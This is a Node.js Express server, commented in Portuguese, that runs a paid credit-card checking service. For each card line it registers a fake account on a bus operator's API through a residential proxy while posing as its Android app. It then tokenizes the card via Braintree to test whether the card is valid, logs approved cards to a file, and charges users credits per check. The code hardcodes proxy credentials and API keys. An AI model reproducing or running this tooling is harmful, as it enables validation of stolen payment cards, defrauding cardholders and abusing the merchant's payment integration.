const express = require('express');
const app = express();
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const Leite = require("leite");
const fs = require('fs');

const { HttpsProxyAgent } = require('https-proxy-agent');

app.use(cors());
app.use(express.json());

const port = 1515;

// Configuração do proxy
const proxyUrl = 'http://flashzxk29-zone-resi-region-br:flashzxk29@f280b6c57513f186.shg.na.pyproxy.io:16666';
const httpsAgent = new HttpsProxyAgent(proxyUrl);

// Função para criar uma instância do axios com o proxy configurado
const axiosInstance = axios.create({
    httpsAgent,
    timeout: 10000 // Timeout opcional em ms
});

// Funções auxiliares e de processamento de cartão
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const randomStr = length => Array(length).fill(0).map(() => (Math.random().toString(36)[2] || 0)).join('');
const generateTimestamp = () => new Date().toISOString().replace(/\.\d{3}Z$/, 'Z');

const cardParser = (line) => {
    const parts = line.split('|');
    if (parts.length >= 3) {
        const [ccn, ccm, ccy, cvv] = parts;
        return [true, ccn, ccm, ccy, cvv];
    }
    return [false];
};

function hasCredit(key) {
    const keys = loadKeys(); // Carrega todas as keys do arquivo
    return keys[key] > 0; // Retorna true se a key existir e tiver créditos
}

function loadKeys() {
    const filePath = path.join(__dirname, 'keys.txt'); // Caminho do arquivo
    if (!fs.existsSync(filePath)) {
        return {}; // Retorna um objeto vazio se o arquivo não existir
    }
    const keys = {};
    const lines = fs.readFileSync(filePath, 'utf8').split('\n'); // Lê o arquivo linha por linha
    lines.forEach(line => {
        if (line.trim()) {
            const [key, credits] = line.split(','); // Divide a key e os créditos
            keys[key] = parseInt(credits, 10); // Armazena como número
        }
    });
    return keys; // Retorna um objeto com todas as keys e seus créditos
}



// Salva as chaves e créditos no arquivo
function saveKeys(keys) {
    const filePath = path.join(__dirname, 'keys.txt');
    const lines = Object.entries(keys).map(([key, credits]) => `${key},${credits}`);
    fs.writeFileSync(filePath, lines.join('\n'), 'utf8');
}

// Deduz créditos de uma chave
function deductCredit(key) {
    const keys = loadKeys();
    if (keys[key] > 0) {
        keys[key] -= 1;
        saveKeys(keys);
        return true;
    }
    return false;
}

// Função de processamento de cartão
async function processCard(line) {
    try {
        const [success, ccn, ccm, ccy, cvv] = cardParser(line.trim());
        if (!success) {
            return { success: false, data: `${line} INVÁLIDO` };
        }

        const cc = {
            m: ccm?.length === 2 ? parseInt(ccm).toString() : ccm,
            mm: ccm?.length === 1 ? ccm.toString().padStart(2, '0') : ccm,
            yy: ccy?.length === 4 ? ccy.slice(2) : ccy,
            yyyy: ccy?.length === 2 ? ccy.toString().padStart(4, '20') : ccy,
        };

      const leite = new Leite();
      const generate = {
          firstName: leite.pessoa.primeiroNome().normalize("NFD").replace(/[\u0300-\u036f]/g, ""),
          lastName: leite.pessoa.sobrenome().normalize("NFD").replace(/[\u0300-\u036f]/g, ""),
          email: leite.pessoa.email().replace('@', `${leite.pessoa.cpf()}@`),
          phone: `11${randomInt(100, 999)}${randomInt(100, 999)}${randomInt(1000, 9999)}`,
          vehicle: randomStr(5).toUpperCase()
      };

      console.log("Iniciando registro do usuário...");
      const querystring = require('querystring');

      const register = await axiosInstance.post(
          'https://ce-a15.corethree.net/Clients/FirstBus/API_RegisterUser',
          querystring.stringify({
              name: "Teste Usuario",  // Nome simplificado e direto
              email: generate.email,
              phone: generate.phone,
              password: '!Aviao1997',
              marketingoptinemaildate: generateTimestamp(),
              marketingoptinageover16date: generateTimestamp()
          }),
          {
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',  // Tipo de dado URL-encoded
                  'apikey': 'cd27d477e7b7485da0f613bee1040f27',
                  'remotehost': '192.168.137.112',
                  'c3-deviceid': 'JP-430f94bce4131351   ',
                  'c3-clienttime': Math.floor(Date.now() / 1000),
                  'c3-capabilities': 'rooted',
                  'accept': '*/*',
                  'user-agent': 'JP/2026000054 (Android; PJX110; Android 14; com.firstgroup.first.bus)'
              }
          }
      );
      




      if (!register.data || !register.data.id) {
          console.error("Falha ao registrar usuário: resposta inesperada", register.data);
          return { success: false, data: "Erro ao registrar usuário" };
      }
      
      console.log("Registro completo:", register.data);

      // Requisição de token de pagamento
      const braintok = await axiosInstance.get('https://ce-a15.corethree.net/Clients/FirstBus/API_Checkout_GetBraintreeClientToken', {
          headers: {
              'c3-userauth': `40247d39409a05f5888b2743bd961fdda9f6853b|${register.data.id}`,
              'apikey': 'cd27d477e7b7485da0f613bee1040f27',
              'remotehost': '192.168.137.163',
              'c3-deviceid': 'JP-430f94BCe4131351',
              'c3-clienttime': Math.floor(Date.now() / 1000),
              'c3-capabilities': 'rooted',
              'accept': '*/*',
              'user-agent': 'JP/2026000013 (Android; PJX110; Android 14; com.firstgroup.first.bus)'
          }
      });

      console.log("Token de pagamento obtido:", braintok.data);

      const authorizationFingerprint = JSON.parse(Buffer.from(braintok.data.token, 'base64').toString('utf8')).authorizationFingerprint;

      // Requisição de pagamento
      const payment = await axiosInstance.post('https://payments.braintree-api.com/graphql', {
          clientSdkMetadata: {
              platform: 'android',
              sessionId: randomStr(32),
              source: 'form',
              integration: 'custom'
          },
          query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brand expirationMonth expirationYear cardholderName last4 binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } }}",
          variables: {
              input: {
                  options: { validate: true },
                  creditCard: {
                      number: ccn,
                      expirationMonth: cc.mm,
                      expirationYear: cc.yy,
                      cvv
                  }
              }
          }
      }, {
          headers: {
              'Authorization': `Bearer ${authorizationFingerprint}`,
              'Braintree-Version': '2018-03-06',
              'User-Agent': 'braintree/android/4.45.0'
          }
      });

      console.log("Resposta de pagamento:", payment.data);

      if (payment.data?.data?.tokenizeCreditCard?.token) {
        const successMessage = `${ccn}|${cc.mm}|${cc.yyyy}|${cvv} M`;
        const aprovadosPath = path.join(__dirname, 'aprovadosss.txt');
        fs.appendFileSync(aprovadosPath, successMessage + '\n'); // Salva em aprovados.txt
        return { success: true, findCVV: false, data: successMessage };
    }
    if (payment.data.errors) {
        const errorMessage = payment.data.errors[0].message;
        const errorLog = `${ccn}|${cc.mm}|${cc.yyyy}|${cvv} N-${errorMessage}`;
        const errosPath = path.join(__dirname, 'reprovadass.txt');
        fs.appendFileSync(errosPath, errorLog + '\n'); // Salva em erros.txt
        return { success: false, banBIN: false, data: errorLog };
    }
} catch (error) {
    console.error("Erro ao processar cartão:", error);

    // Registra o erro no arquivo erros.txt
    const errorLog = `${line} ERRO - ${error.message || "Erro desconhecido"}`;
    const errosPath = path.join(__dirname, 'errosdesconhecidos.txt');
    fs.appendFileSync(errosPath, errorLog + '\n'); // Salva em erros.txt
    return { success: false, error: true, data: errorLog };
        };
    }
app.post('/process-card', async (req, res) => {
    const { line, key } = req.body;

    // Valida se a key foi enviada
    if (!key) {
        return res.status(400).json({ success: false, message: "Key não fornecida." });
    }

    // Verifica se a key tem créditos
    if (!hasCredit(key)) {
        return res.status(403).json({ success: false, message: "Key inválida ou sem créditos." });
    }

    // Processa o cartão
    const result = await processCard(line);

    // Deduz um crédito se o processamento foi bem-sucedido
    if (result.success) {
        deductCredit(key);
        result.message += ` | Crédito restante: ${loadKeys()[key]}`;
    }

    res.json(result);
});


app.post('/get-balance', (req, res) => {
    const { key } = req.body; // Captura a key enviada no corpo da requisição

    // Verifica se a key foi enviada
    if (!key) {
        return res.status(400).json({ success: false, message: "Key não fornecida." });
    }

    // Carrega as keys e verifica se a key existe
    const keys = loadKeys(); // Lê o arquivo keys.txt
    if (!keys[key]) {
        return res.status(404).json({ success: false, message: "Chave não encontrada." });
    }

    // Retorna o saldo da key
    const balance = keys[key];
    return res.json({ success: true, balance });
});


app.post('/validate-key', (req, res) => {
    const { key } = req.body;

    // Verifica se a key foi enviada
    if (!key) {
        return res.status(400).json({ success: false, message: "Key não fornecida." });
    }

    // Verifica se a key é válida e tem créditos
    if (!hasCredit(key)) {
        return res.status(403).json({ success: false, message: "Chave inválida ou sem créditos." });
    }

    // Retorna sucesso se a key for válida
    return res.json({ success: true, message: "Key válida." });
});



// Inicia o servidor Express
app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
    console.log(`Acesse o minigame em http://localhost:${port}/minigame`);
});

// Servir o arquivo minigame.html na rota /minigame
app.get('/minigame', (req, res) => {
  res.sendFile(path.join(__dirname, 'minigame.html'));
});